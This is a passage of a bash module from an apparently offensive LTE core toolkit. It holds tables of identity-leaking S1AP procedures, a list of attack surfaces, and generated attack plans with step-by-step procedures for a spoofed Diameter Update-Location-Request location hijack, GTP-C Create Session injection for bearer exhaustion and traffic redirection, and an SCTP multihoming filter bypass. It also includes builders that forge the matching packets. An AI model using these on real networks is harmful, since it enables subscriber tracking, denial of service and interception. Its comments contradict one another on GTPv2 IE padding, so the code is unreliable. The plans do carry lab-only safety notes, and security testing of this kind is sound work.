PathSwitchRequest	3	PathSwitchRequest	no
HandoverCancellation	4	HandoverCancel	no
E-RABSetup	5	E-RABSetupRequest	no
E-RABModify	6	E-RABModifyRequest	no
E-RABRelease	7	E-RABReleaseCommand	no
E-RABReleaseIndication	8	E-RABReleaseIndication	no
InitialContextSetup	9	InitialContextSetupRequest	yes: UE identity via MME-UE-S1AP-ID
Reset	14	Reset	no
DownlinkNASTransport	11	DownlinkNASTransport	yes: NAS PDU (may carry Identity Request)
InitialUEMessage	12	InitialUEMessage	yes: S-TMSI or IMSI, TAI, ECGI, RRC establishment cause
UplinkNASTransport	13	UplinkNASTransport	yes: NAS PDU (may carry Identity Response with IMSI)
NASNonDeliveryIndication	15	NASNonDeliveryIndication	yes: NAS PDU
ErrorIndication	16	ErrorIndication	no
UEContextReleaseRequest	18	UEContextReleaseRequest	no
UEContextRelease	23	UEContextReleaseCommand	no
Paging	10	Paging	yes: UE Identity Index value (IMSI mod 1024)
S1Setup	17	S1SetupRequest	no
UEContextModification	21	UEContextModificationRequest	no
UECapabilityInfoIndication	22	UECapabilityInfoIndication	no
eNBStatusTransfer	24	eNBStatusTransfer	no
MMEStatusTransfer	25	MMEStatusTransfer	no
DeactivateTrace	26	DeactivateTrace	no
TraceStart	27	TraceStart	no
TraceFailureIndication	28	TraceFailureIndication	no
LocationReportingControl	29	LocationReportingControl	no
LocationReportingFailureIndication	30	LocationReportingFailureIndication	no
LocationReport	31	LocationReport	yes: E-UTRAN CGI, TAI, PSCell
OverloadStart	32	OverloadStart	no
OverloadStop	33	OverloadStop	no
WriteReplaceWarning	34	WriteReplaceWarningRequest	no
eNBDirectInformationTransfer	35	eNBDirectInformationTransfer	no
MMEDirectInformationTransfer	36	MMEDirectInformationTransfer	no
PrivateMessage	37	PrivateMessage	no
eNBConfigurationTransfer	38	eNBConfigurationTransfer	no
MMEConfigurationTransfer	39	MMEConfigurationTransfer	no
CellTrafficTrace	40	CellTrafficTrace	no
Kill	43	Kill	no
DownlinkUEAssociatedLPPaTransport	44	DownlinkUEAssociatedLPPaTransport	yes
UplinkUEAssociatedLPPaTransport	45	UplinkUEAssociatedLPPaTransport	yes
DownlinkNonUEAssociatedLPPaTransport	46	DownlinkNonUEAssociatedLPPaTransport	no
UplinkNonUEAssociatedLPPaTransport	47	UplinkNonUEAssociatedLPPaTransport	no
EOF
}

lcore_s1ap_identity_procedures() {
    cat <<'EOF'
procedure	code	direction	identity_risk
InitialUEMessage	12	eNB -> MME	high: a UE that has no S-TMSI must send its IMSI in the clear in the NAS Attach Request
UplinkNASTransport	13	eNB -> MME	high: carries Identity Response; an IMSI answer is readable on the S1-MME
DownlinkNASTransport	11	MME -> eNB	high: carries Identity Request; if issued before Security Mode it is the classic exposure
Paging	10	MME -> eNB	medium: UE Identity Index value = IMSI mod 1024, so an observer can correlate a subscriber
LocationReport	31	eNB -> MME	medium: precise E-UTRAN CGI and TAI for a live subscriber
EOF
}

# ── attack-surface notes ────────────────────────────────────────────────
lcore_surface_notes() {
    cat <<'EOF'
surface	protocol	precondition	impact	note
unprotected-diameter-peer	Diameter/S6a	TCP or SCTP reachable on 3868 with no TLS and no IPsec	credential and subscriber-data exposure	Diameter has no built-in confidentiality; RFC 6733 §6.2 and TS 33.210 place security in IPsec or TLS, and field deployments frequently run neither on the internal core
spoofed-ulr	Diameter/S6a	a peer that accepts an Update-Location-Request from an unauthorised Origin-Host	location hijack and subscriber DoS	a forged ULR moves the subscriber's serving node to the attacker's identity; subsequent MT traffic and paging are directed elsewhere, and the real MME is cancelled
gtpc-create-session-injection	GTP-C v2	a reachable S-GW or P-GW TEID with no peer allow-list	resource exhaustion and traffic redirection	a Create Session Request carries the IMSI, TAI/ECGI and APN; an accepted one allocates a bearer and a charging record for a session the attacker controls
sctp-multihoming	SCTP/S1-MME	an association with more than one path	path failover is abused to bypass a single-homed filter	SCTP multihoming (RFC 4960 §6.4) lets a peer add an address with ASCONF; a filtering middlebox on the primary path does not see the alternate one
gtpu-teid-guessing	GTP-U	an S-GW or P-GW that accepts G-PDUs for unknown TEIDs	tenant traffic injection and interception	the TEID is a 32-bit value with no integrity protection; a lab can enumerate live TEIDs from the control plane and inject into the user plane
EOF
}

# ── plan files — status: handoff ────────────────────────────────────────
lcore_plan_write() {
    local name="$1" title="$2" needs="$3" body="$4"
    mkdir -p "$LCORE_PLANS" || {
        printf 'ERROR\tcannot create %s\n' "$LCORE_PLANS" >&2; return 1
    }
    local out="$LCORE_PLANS/${name}.plan"
    {
        printf 'status: handoff\n'
        printf 'plan: %s\n' "$title"
        printf 'module: 11_lte_core.sh (lcore)\n'
        printf 'requires: %s\n' "$needs"
        printf 'generated: %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
        printf '\n'
        printf '%s\n' "$body"
    } > "$out" || { printf 'ERROR\tcould not write %s\n' "$out" >&2; return 1; }
    [[ -s "$out" ]] || { printf 'ERROR\t%s is empty\n' "$out" >&2; return 1; }
    printf '%s' "$out"
}

lcore_plan_ulr_hijack() {
    local body
    body=$(cat <<'EOF'
# Spoofed Update-Location-Request (S6a/S6d) — subscriber location hijack

## What this does
An MME identifies itself to the HSS in a ULR by its Origin-Host and
Origin-Realm. A forged ULR that names a different serving node causes the
HSS to move the subscriber's registration to that node and to cancel the
registration at the real MME (CLR/CLA, command 317). The subscriber
then cannot be paged or reached for MT services until they re-attach.

## What is already implemented in software
- ULR built byte-exactly: `11_lte_core.sh --build-ulr <IMSI>`
  (command 316, application 16777251, Origin-Host/Realm, Session-Id,
  User-Name, Visited-PLMN-Id, ULR-Flags, RAT-Type).
- Full Diameter header and AVP encode/decode, including grouped AVPs.
- CLR builder: the same request shape a real HSS sends after a hijack.

## What the handoff needs
1. A lab HSS with an S6a peer reachable over TCP or SCTP on port 3868
   (free5GC, Open5GS, or a commercial HSS in a test rack).
2. That peer configured to accept requests from a *new* Origin-Host —
   i.e. no Diameter peer allow-list and no TLS. If the peer validates
   Origin-Host against a configured peer table, the vector does not run.
3. A subscriber provisioned in the HSS whose IMSI you may deregister.
4. A second MME (srsRAN + a real MME, or a second Open5GS MME instance)
   to observe the CLR arriving at the legitimate serving node.

## Steps
1. Bring up the lab MME and attach a test UE; capture S6a on the HSS.
2. Read the real ULR from the capture to learn the accepted Origin-Host.
3. `11_lte_core.sh --build-ulr <IMSI> <forged-host> <realm> <plmn> 6 0`
4. Send the bytes over the S6a transport with a Diameter client.
5. Watch for a 2001 ULA and for a CLR leaving the HSS toward the real MME.
6. Confirm the UE is no longer reachable (MT call or paging attempt).

## Safety
This deregisters a real subscriber. Only run it against an IMSI that is
provisioned for the test, on a network you own or are contracted to test.
EOF
)
    lcore_plan_write "ulr-hijack" "Spoofed S6a Update-Location-Request (subscriber location hijack)" \
        "a lab HSS with an exposed S6a peer (TCP/SCTP 3868, no TLS, no peer allow-list) plus one provisioned test IMSI; optionally a second MME to observe the CLR" \
        "$body"
}

lcore_plan_gtp_inject() {
    local body
    body=$(cat <<'EOF'
# GTP-C Create Session injection into an EPC

## What this does
A Create Session Request (message type 32) sent to an S-GW or P-GW with a
valid TEID makes the core allocate a bearer and a charging record for a
session that never carried a real UE attach. Repeated injection exhausts
bearer and TEID space, and an accepted session redirects user-plane
traffic to an attacker-chosen address.

## What is already implemented in software
- GTP-C v2 header encode/decode with the TEID and the 24-bit sequence
  number (`--decode-gtp-c`), and the full IE walk with correct 4-octet
  padding.
- IE decode for IMSI (1), Cause (2), MSISDN (3), APN (71), TAI (87),
  ECGI (86) and ULI (114) with real TS 29.274 field layouts.
- GTP-U G-PDU header and extension-header-chain decode (`--decode-gtp-u`).

## What the handoff needs
1. A lab EPC: an S-GW and P-GW (Open5GS, free5GC, or srsRAN's
   srsepc) on a network you control.
2. The S-GW or P-GW GTP-C endpoint reachable on UDP 2123 and willing to
   accept a Create Session Request from an unknown peer address.
3. A valid TEID for the peer, learned from a legitimate Create Session
   Response captured on the same interface.
4. The attacker's own SGW/PGW F-TEID and an IP address the core can route
   to, so the created session has somewhere to point.

## Steps
1. Capture a legitimate attach on S11 and record the control TEID the
   S-GW uses in its Create Session Response.
2. Replay a Create Session Request with that TEID and a test IMSI.
3. Observe bearer allocation in the P-GW (a new TEID and charging record).
4. Repeat at rate to measure exhaustion.
5. `11_lte_core.sh --decode-gtp-u <hex>` on the resulting G-PDUs to
   confirm which TEIDs carry traffic.

## Safety
Creating sessions consumes core resources and generates charging records.
Confine it to a lab EPC and a test IMSI.
EOF
)
    lcore_plan_write "gtp-inject" "GTP-C v2 Create Session Request injection into a lab EPC" \
        "a lab EPC (Open5GS/free5GC/srsepc) with a GTP-C endpoint on UDP 2123 accepting Create Session Requests, plus a captured valid TEID and an attacker-owned F-TEID address" \
        "$body"
}

lcore_plan_sctp_scan() {
    local body
    body=$(cat <<'EOF'
# SCTP multihoming review against S1-MME / S6a transports

## What this does
SCTP (RFC 4960) is the transport for S1-MME (port 36412) and is an option
for Diameter S6a (port 3868). Its multihoming feature lets an endpoint add
or delete addresses on a live association with ASCONF chunks. A filter or
allow-list applied to the primary path only does not cover an address the
peer adds later, so an association can move traffic to a path the operator
never intended to expose.

## What is already implemented in software
- S1AP procedure and identity-carrier tables (`--plan sctp-scan` output and
  the `s1ap-*` verbs), naming which procedures carry subscriber identity.
- Diameter and GTP-C/GTP-U decoders to read whatever the association
  carries once it is up.

## What the handoff needs
1. A lab MME or eNB exposing SCTP on 36412, reachable with more than one
   local address (two NICs, or two addresses on one interface).
2. An SCTP tool that can send ASCONF and ASCONF-ACK: `sctp_test` from
   lksctp-tools, or `scapy` with the SCTP layer.
3. A middlebox or ACL on the primary path that is expected to filter the
   association, so the alternate path can be shown to bypass it.

## Steps
1. `ss -S` and confirm the multihomed association addresses.
2. Bring up an SCTP association to 36412 and complete the four-way
   handshake (INIT / INIT-ACK / COOKIE-ECHO / COOKIE-ACK).
3. Send ASCONF adding a second local address; wait for ASCONF-ACK.
4. Confirm the peer now accepts DATA chunks on the added path.
5. Show that a filter matching only the primary address no longer sees
   the S1AP payload.

## Safety
An SCTP association against a production MME is a denial-of-service risk.
Only exercise this against a lab core.
EOF
)
    lcore_plan_write "sctp-scan" "SCTP multihoming review against S1-MME and Diameter transports" \
        "a lab MME or eNB with SCTP on 36412 reachable over two or more local addresses, plus lksctp-tools (sctp_test) or scapy with the SCTP layer, and a middlebox on the primary path to demonstrate the bypass" \
        "$body"
}

lcore_cmd_plan() {
    local which="${1:-}" pf rc
    case "$which" in
        ulr-hijack)  pf=$(lcore_plan_ulr_hijack);  rc=$? ;;
        gtp-inject)  pf=$(lcore_plan_gtp_inject);  rc=$? ;;
        sctp-scan)   pf=$(lcore_plan_sctp_scan);   rc=$? ;;
        *)
            printf 'ERROR\tunknown plan: %s (want ulr-hijack|gtp-inject|sctp-scan)\n' \
                "$(lcore_sanitize "${which:-<none>}")" >&2
            return 2 ;;
    esac
    # A plan verb performs no action: it writes a plan file and says so.
    [[ "$rc" -eq 0 && -n "$pf" ]] || return "${rc:-1}"
    printf 'plan_file\t%s\n' "$pf"
    printf 'status\thandoff\n'
    printf 'note\t%s\n' "this vector needs the testbed named in the plan; no traffic was sent"
    return 0
}

# ── CLI verbs ───────────────────────────────────────────────────────────
lcore_cli_status_tsv() {
    local plans=0
    [[ -d "$LCORE_PLANS" ]] && plans=$(find "$LCORE_PLANS" -name '*.plan' -type f 2>/dev/null | wc -l)
    printf 'module\tlte_core\n'
    printf 'tag\tlcore\n'
    printf 'dir\t%s\n' "$LCORE_DIR"
    printf 'plans_dir\t%s\n' "$LCORE_PLANS"
    printf 'plans\t%s\n' "$plans"
    printf 's6a_app_id\t16777251\n'
    printf 'refs\tRFC 6733, TS 29.272, TS 29.274, TS 29.281, TS 36.413\n'
    printf 'verbs\tdecode-diameter, decode-gtp-c, decode-gtp-u, build-air, build-ulr, build-clr, gtp-csr-forge, gtp-modify-bearer, gtp-in-gtp, mbms-session, gtpc-send, diameter-send, gtpdoor-detect, cdr-fraud-check, fs20-audit, plan, s1ap, surface, require-core\n'
    printf 'gtp_in_gtp\tyes\n'
    printf 'mbms_session\tyes\n'
    printf 'decode_only\t%s\n' "$(lcore_find_core_testbed >/dev/null 2>&1 && echo no || echo yes)"
}

# Hardware guard: name what is missing rather than reporting an empty result.
lcore_find_core_testbed() {
    local t found=""
    for t in open5gs-mmed free5gc-mmed srsepc mme; do
        command -v "$t" >/dev/null 2>&1 && found+="${found:+,}$t"
    done
    [[ -n "$found" ]] && { echo "$found"; return 0; }
    return 1
}

lcore_require_core() {
    local c; c=$(lcore_find_core_testbed) || {
        printf 'ERROR\tno EPC testbed — install Open5GS (open5gs-mmed), free5GC (free5gc-mmed) or srsRAN (srsepc) to run a live S6a/GTP vector\n' >&2
        return 1
    }
    printf 'OK\t%s\n' "$c"
}

lcore_cmd_decode_diameter() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-diameter <hex>\n' >&2; return 2; }
    local hdr; hdr=$(lcore_diameter_parse_header "$hex") || return 1
    printf '%s\n' "$hdr"
    local body; body=$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="body"{print $2}')
    # An AVP walk that refuses the stream must make the verb fail: a caller
    # (or a GUI button) that only sees exit 0 would treat a malformed packet
    # as a good one.
    local walk=0
    if [[ -n "$body" ]]; then lcore_diameter_parse_avps "$body" || walk=1; fi
    return "$walk"
}

lcore_cmd_decode_gtp_c() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-gtp-c <hex>\n' >&2; return 2; }
    local hdr; hdr=$(lcore_gtpc_parse_header "$hex") || return 1
    printf '%s\n' "$hdr"
    local payload; payload=$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="payload"{print $2}')
    local walk=0
    if [[ -n "$payload" ]]; then lcore_gtpc_parse_ies "$payload" || walk=1; fi
    return "$walk"
}

lcore_cmd_decode_gtp_u() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-gtp-u <hex>\n' >&2; return 2; }
    lcore_gtpu_parse_header "$hex"
}

lcore_cmd_build_air() {
    local imsi="${1:-310150123456789}"
    local msg; msg=$(lcore_build_air "$imsi" "${2:-mme.localdomain}" "${3:-localdomain}" "${4:-1}") || return 1
    printf 'message\tAuthentication-Information-Request (AIR)\n'
    printf 'command_code\t318\n'
    printf 'application_id\t16777251\n'
    printf 'imsi\t%s\n' "$imsi"
    printf 'octets\t%s\n' "$(( ${#msg} / 2 ))"
    printf 'hex\t%s\n' "$msg"
    # Prove the build by parsing it back.
    local hdr; hdr=$(lcore_diameter_parse_header "$msg") || return 1
    printf 'roundtrip_command\t%s\n' "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="command_code"{print $2}')"
    printf 'roundtrip_app\t%s\n'     "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="application_id"{print $2}')"
    printf 'roundtrip_R\t%s\n'       "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="flag_R"{print $2}')"
    printf 'roundtrip_length_ok\t%s\n' "$([[ "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="length_mismatch"{print $2}')" == "no" ]] && echo yes || echo no)"
}

lcore_cmd_build_clr() {
    local imsi="${1:-310150123456789}"
    local msg; msg=$(lcore_build_clr "$imsi" "${2:-hss.localdomain}" "${3:-localdomain}" "${4:-0}") || return 1
    printf 'message\tCancel-Location-Request (CLR)\n'
    printf 'command_code\t317\n'
    printf 'application_id\t16777251\n'
    printf 'imsi\t%s\n' "$imsi"
    printf 'octets\t%s\n' "$(( ${#msg} / 2 ))"
    printf 'hex\t%s\n' "$msg"
    local hdr; hdr=$(lcore_diameter_parse_header "$msg") || return 1
    printf 'roundtrip_command\t%s\n' "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="command_code"{print $2}')"
    printf 'roundtrip_app\t%s\n'     "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="application_id"{print $2}')"
    printf 'roundtrip_length_ok\t%s\n' "$([[ "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="length_mismatch"{print $2}')" == "no" ]] && echo yes || echo no)"
}

lcore_cmd_build_ulr() {
    local imsi="${1:-310150123456789}"
    local msg; msg=$(lcore_build_ulr "$imsi" "${2:-mme.localdomain}" "${3:-localdomain}" "${4:-02F810}" "${5:-6}" "${6:-0}") || return 1
    printf 'message\tUpdate-Location-Request (ULR)\n'
    printf 'command_code\t316\n'
    printf 'application_id\t16777251\n'
    printf 'imsi\t%s\n' "$imsi"
    printf 'octets\t%s\n' "$(( ${#msg} / 2 ))"
    printf 'hex\t%s\n' "$msg"
    local hdr; hdr=$(lcore_diameter_parse_header "$msg") || return 1
    printf 'roundtrip_command\t%s\n' "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="command_code"{print $2}')"
    printf 'roundtrip_app\t%s\n'     "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="application_id"{print $2}')"
    printf 'roundtrip_length_ok\t%s\n' "$([[ "$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="length_mismatch"{print $2}')" == "no" ]] && echo yes || echo no)"
}

# ── GTP-C session hijack (TS 29.274) ────────────────────────────────────
# The control plane that owns every subscriber's data tunnel trusts any peer
# on the GRX/IPX fabric. Forging a Create Session Request allocates a bearer;
# forging a Modify Bearer reassigns an existing bearer's S1-U F-TEID. Either
# redirects the user plane (interception) and mis-attributes the traffic on
# the charging record (overbilling).

# digits -> BCD with an F nibble on an odd tail (the IMSI coding).
lcore_bcd_encode() {
    local d="${1:-}"
    [[ "$d" =~ ^[0-9]+$ && ${#d} -ge 2 ]] || { printf 'ERROR\tdigits required\n' >&2; return 2; }
    local out="" i n=${#d} lo hi
    for (( i = 0; i < n; i += 2 )); do
        lo="${d:i:1}"
        if (( i + 1 < n )); then hi="${d:i+1:1}"; else hi="F"; fi
        out+="${hi}${lo}"
    done
    printf '%s' "$out"
}
# One GTP-C IE: type(1) length(2) spare/instance(1) value, padded to a
# 4-octet boundary; padding is not counted in Length.
lcore_gtpc_ie() {
    local type="${1:-}" val; val=$(lcore_nfc "${2:-}")
    local inst="${3:-0}"
    [[ "$type" =~ ^[0-9]+$ ]] || { printf 'ERROR\tIE type must be numeric\n' >&2; return 2; }
    lcore_is_hex "$val" || { printf 'ERROR\tIE value must be hex\n' >&2; return 2; }
    local len=$(( ${#val} / 2 ))
    # NO PADDING. TS 29.274 §8.2 makes the Length field the actual length of the
    # value and puts nothing after it; 4-octet padding is the GTPv1-C (TS 29.060)
    # convention and does not carry over. This builder used to pad, and the
    # in-tree oracle used to pad with it, so the two agreed with each other and
    # both disagreed with the wire: tshark 4.2.2 reports "[Malformed Packet:
    # GTPv2]" on every padded IE, and pycrate advances by exactly 4+Length.
    local ie; printf -v ie '%02X%04X%02X%s' "$(( type & 0xFF ))" "$(( len & 0xFFFF ))" "$(( inst & 0x0F ))" "$val"
    printf '%s' "$ie"
}
# A GTPv2-C message: Flags(1) Type(1) Length(2) [TEID(4)] Seq(3) Spare(1) body.
lcore_gtpc_msg() {
    local type="${1:-}" teid="${2:-}" seq="${3:-0}" payload; payload=$(lcore_nfc "${4:-}")
    local T=0 teid_hex=""
    if [[ -n "$teid" ]]; then T=1; teid_hex=$(printf '%08X' "$(( 16#$teid ))"); fi
    local flags; printf -v flags '%02X' "$(( (2 << 5) | (T << 3) ))"
    local tail=$(( (T ? 4 : 0) + 4 + ${#payload} / 2 ))
    local out; printf -v out '%s%02X%04X%s' "$flags" "$(( type & 0xFF ))" "$(( tail & 0xFFFF ))" "$teid_hex"
    printf -v out '%s%06X00' "$out" "$(( seq & 0xFFFFFF ))"
    printf '%s%s' "$out" "$payload"
}
# PLMN to 3 BCD octets, TS 24.008 §10.5.1.3 (Serving Network IE 111).
lcore_plmn_bcd() {
    local mcc="${1:-}" mnc="${2:-}" o1 o2 o3
    [[ "$mcc" =~ ^[0-9]{3}$ && "$mnc" =~ ^[0-9]{2,3}$ ]] || { printf 'ERROR\tMCC 3 digits, MNC 2 or 3\n' >&2; return 2; }
    o1=$(( (10#${mcc:1:1} << 4) | 10#${mcc:0:1} ))
    if (( ${#mnc} == 3 )); then o2=$(( (10#${mnc:2:1} << 4) | 10#${mcc:2:1} ))
    else o2=$(( (0xF << 4) | 10#${mcc:2:1} )); fi
    o3=$(( (10#${mnc:1:1} << 4) | 10#${mnc:0:1} ))
    printf '%02X%02X%02X' "$o1" "$o2" "$o3"
}
lcore_apn_encode() {
    local apn="${1:-}" out="" label lhex
    [[ -n "$apn" ]] || { printf 'ERROR\tAPN required\n' >&2; return 2; }
    local IFS='.'
    for label in $apn; do
        [[ "$label" =~ ^[A-Za-z0-9-]+$ ]] || { printf 'ERROR\tbad APN label: %s\n' "$label" >&2; return 2; }
        lhex=$(printf '%s' "$label" | od -An -tx1 | tr -d ' \n')
        out+=$(printf '%02x%s' "${#label}" "$lhex")
    done
    printf '%s' "$out"
}

# ── GTP-in-GTP and MBMS Session Start ──────────────────────────────────
#
#   --gtp-in-gtp    a GTPv1-U G-PDU whose T-PDU payload is another GTP
#                   message (TS 29.281 §5.1)
#   --mbms-session  a GTPv2-C MBMS Session Start Request (TS 29.274
#                   §7.13.1, message type 231)
#
# Both are octets and nothing else. `sent` is 0 on every path: publishing
# them is --gtpc-send's job (armed separately) or a --plan naming a testbed.

# One's-complement 16-bit checksum over a whole number of hex words.
lcore_csum16() {
    local h; h=$(lcore_nfc "${1:-}")
    (( ${#h} % 4 == 0 )) || {
        printf 'ERROR\tchecksum input is not a whole number of 16-bit words\n' >&2; return 1; }
    local sum=0 i
    for (( i = 0; i < ${#h}; i += 4 )); do
        sum=$(( sum + 16#${h:$i:4} ))
        sum=$(( (sum & 0xFFFF) + (sum >> 16) ))
    done
    printf '%04X' $(( (~sum) & 0xFFFF ))
}

# A dotted quad to the four octets an IPv4 header carries.
lcore_ipv4_hex() {
    local q="${1:-}" a b c d
    IFS='.' read -r a b c d <<<"$q"
    [[ "$a" =~ ^[0-9]{1,3}$ && "$b" =~ ^[0-9]{1,3}$ &&
       "$c" =~ ^[0-9]{1,3}$ && "$d" =~ ^[0-9]{1,3}$ ]] || return 1
    (( 10#$a <= 255 && 10#$b <= 255 && 10#$c <= 255 && 10#$d <= 255 )) || return 1
    printf '%02X%02X%02X%02X' "$((10#$a))" "$((10#$b))" "$((10#$c))" "$((10#$d))"
}

# IPv4 header (RFC 791 §3.1) plus payload: 20-octet header, checksum computed.
lcore_ipv4_build() {
    local src="${1:-}" dst="${2:-}" payload; payload=$(lcore_nfc "${3:-}")
    local proto="${4:-17}" saddr daddr
    saddr=$(lcore_ipv4_hex "$src") || {
        printf 'ERROR\tsource is not a dotted quad: %s\n' "$(lcore_sanitize "$src")" >&2; return 2; }
    daddr=$(lcore_ipv4_hex "$dst") || {
        printf 'ERROR\tdestination is not a dotted quad: %s\n' "$(lcore_sanitize "$dst")" >&2; return 2; }
    [[ -z "$payload" ]] || lcore_is_hex "$payload" || {
        printf 'ERROR\tIPv4 payload must be hex\n' >&2; return 2; }
    local total=$(( 20 + ${#payload} / 2 ))
    (( total <= 65535 )) || {
        printf 'ERROR\tIPv4 total length %d does not fit the 16-bit field\n' "$total" >&2; return 2; }
    local hdr; printf -v hdr '4500%04X0000000040%02X0000%s%s' \
        "$total" "$(( proto & 0xFF ))" "$saddr" "$daddr"
    printf '%s%s%s%s' "${hdr:0:20}" "$(lcore_csum16 "$hdr")" "${hdr:24}" "$payload"
}

# A G-PDU per TS 29.281 §5.1: Flags(1) Type=0xFF(1) Length(2) TEID(4),
# plus the 4-octet trailer the S flag introduces (§4.2: sequence number,
# N-PDU number, next extension header type). Length counts the octets after
# the 8-octet mandatory header, so the trailer belongs to it.
lcore_gtpu_gtpdu() {
    local teid="${1:-}" payload; payload=$(lcore_nfc "${2:-}")
    local seq="${3:-}"
    [[ "$teid" =~ ^[0-9A-Fa-f]{1,8}$ ]] || {
        printf 'ERROR\tTEID must be 1..8 hex digits, got %s\n' "$(lcore_sanitize "$teid")" >&2; return 2; }
    lcore_is_hex "$payload" || { printf 'ERROR\tT-PDU payload must be hex\n' >&2; return 2; }
    [[ -n "$payload" ]] || { printf 'ERROR\tT-PDU payload is empty\n' >&2; return 2; }
    local flags="30" trailer="" len=$(( ${#payload} / 2 ))
    if [[ -n "$seq" ]]; then
        [[ "$seq" =~ ^[0-9A-Fa-f]{1,4}$ ]] || {
            printf 'ERROR\tsequence number must be 1..4 hex digits, got %s\n' "$(lcore_sanitize "$seq")" >&2; return 2; }
        flags="32"
        printf -v trailer '%04X0000' "$(( 16#$seq & 0xFFFF ))"
        len=$(( len + 4 ))
    fi
    local out; printf -v out '%sFF%04X%08X' "$flags" "$(( len & 0xFFFF ))" "$(( 16#$teid ))"
    printf '%s%s%s' "$out" "$trailer" "$payload"
}

# One GTP-C IE with no padding: type(1) length(2) spare/instance(1) value.
# tshark reads a GTPv2-C stream as 4+Length with no padding and calls a
# padded stream Malformed Packet, so the MBMS builder follows the decoder
# the brief made the authority. lcore_gtpc_ie keeps the padded form for the
# verbs that were already here.
lcore_gtpc_ie_raw() {
    local type="${1:-}" val; val=$(lcore_nfc "${2:-}")
    local inst="${3:-0}"
    [[ "$type" =~ ^[0-9]+$ ]] || { printf 'ERROR\tIE type must be numeric\n' >&2; return 2; }
    lcore_is_hex "$val" || { printf 'ERROR\tIE value must be hex\n' >&2; return 2; }
    printf '%02X%04X%02X%s' "$(( type & 0xFF ))" "$(( (${#val} / 2) & 0xFFFF ))" "$(( inst & 0x0F ))" "$val"
}

# §8.15 Bearer QoS: octet 5 flags, octet 6 QCI, then MBR uplink, MBR
# downlink, GBR uplink, GBR downlink, five octets each, kbit/s.
lcore_qos_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    (( ${#v} >= 4 )) || { printf 'truncated'; return 0; }
    local out; printf -v out 'qci=%d flags=0x%s' "$(( 16#${v:2:2} ))" "${v:0:2}"
    if (( ${#v} >= 44 )); then
        out+=$(printf ' mbr_ul=%d mbr_dl=%d gbr_ul=%d gbr_dl=%d' \
            "$(( 16#${v:4:10} ))" "$(( 16#${v:14:10} ))" \
            "$(( 16#${v:24:10} ))" "$(( 16#${v:34:10} ))")
    fi
    printf '%s' "$out"
}

# §8.69 MBMS Session Duration, three octets: bits ssss ssss ssss ssss
# sddd dddd — a 17-bit second count then a 7-bit day count (TS 29.061
# §17.7.7). All zero means "indefinite", an always-on session.
lcore_mbms_duration_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    (( ${#v} == 6 )) || { printf 'length=%d (three octets expected)' "$(( ${#v} / 2 ))"; return 0; }
    local n=$(( 16#$v ))
    local secs=$(( n >> 7 )) days=$(( n & 0x7F ))
    if (( secs == 0 && days == 0 )); then
        printf 'indefinite'
    else
        printf 'seconds=%d days=%d' "$secs" "$days"
    fi
}

# §8.70 MBMS Service Area: the first octet is the number of service area
# codes minus one (TS 29.061 §17.7.6), then two octets per code; the code 0
# means the whole PLMN.
lcore_mbms_area_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    (( ${#v} >= 2 )) || { printf 'truncated'; return 0; }
    local n0; n0=$(( 16#${v:0:2} ))
    local cnt; cnt=$(( n0 + 1 ))
    local ids="" i
    for (( i = 2; i + 4 <= ${#v}; i += 4 )); do
        ids+="${ids:+,}$(( 16#${v:$i:4} ))"
    done
    local got=$(( (${#v} - 2) / 4 ))
    local out; printf -v out 'codes=%d ids=%s' "$got" "${ids:-none}"
    if (( got != cnt )); then
        out+=$(printf ' note=first octet 0x%s claims %d code(s) but %d pair(s) follow' "${v:0:2}" "$cnt" "$got")
    fi
    printf '%s' "$out"
}

# §8.73 MBMS IP Multicast Distribution: Common TEID (4 octets), then a
# type(2 bits) length(6 bits) octet and the address for the distribution
# address, the same for the source address, then the MBMS HC indicator. The
# length is in octets: 4 for IPv4, 16 for IPv6.
lcore_mbms_mcdist_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    (( ${#v} >= 8 )) || { printf 'truncated'; return 0; }
    local out="cteid=0x${v:0:8}" off=8 i label tl olen addr
    for i in 1 2; do
        (( off + 2 <= ${#v} )) || break
        tl=$(( 16#${v:$off:2} ))
        olen=$(( tl & 0x3F ))
        off=$(( off + 2 ))
        (( off + olen * 2 <= ${#v} )) || { printf '%s truncated' "$out"; return 0; }
        addr="${v:$off:$((olen * 2))}"
        off=$(( off + olen * 2 ))
        if (( i == 1 )); then label=dist; else label=src; fi
        if (( olen == 4 )); then
            out+=$(printf ' %s=%d.%d.%d.%d' "$label" \
                "$(( 16#${addr:0:2} ))" "$(( 16#${addr:2:2} ))" \
                "$(( 16#${addr:4:2} ))" "$(( 16#${addr:6:2} ))")
        else
            out+=" ${label}=0x${addr}"
        fi
    done
    if (( off + 2 <= ${#v} )); then
        out+=" hc=$(( 16#${v:$off:2} ))"
    fi
    printf '%s' "$out"
}

# §8.89 TMGI: the MBMS Service ID (3 octets) then MCC/MNC (3 octets), with
# no leading identity-type octet — that octet belongs to the NAS TMGI of
# TS 24.008, not to this GTP-C IE.
lcore_tmgi_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    (( ${#v} >= 12 )) || { printf 'truncated'; return 0; }
    printf 'service_id=%s plmn=%s' "${v:0:6}" "$(lcore_plmn_from_octets "${v:6:6}")"
}

# MBMS Flags: six spare bits, LMRI, MSRI (the layout the independent
# implementation carries; Wireshark shows the octet without dissecting it).
lcore_mbms_flags_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    (( ${#v} >= 2 )) || { printf 'truncated'; return 0; }
    local b=$(( 16#${v:0:2} ))
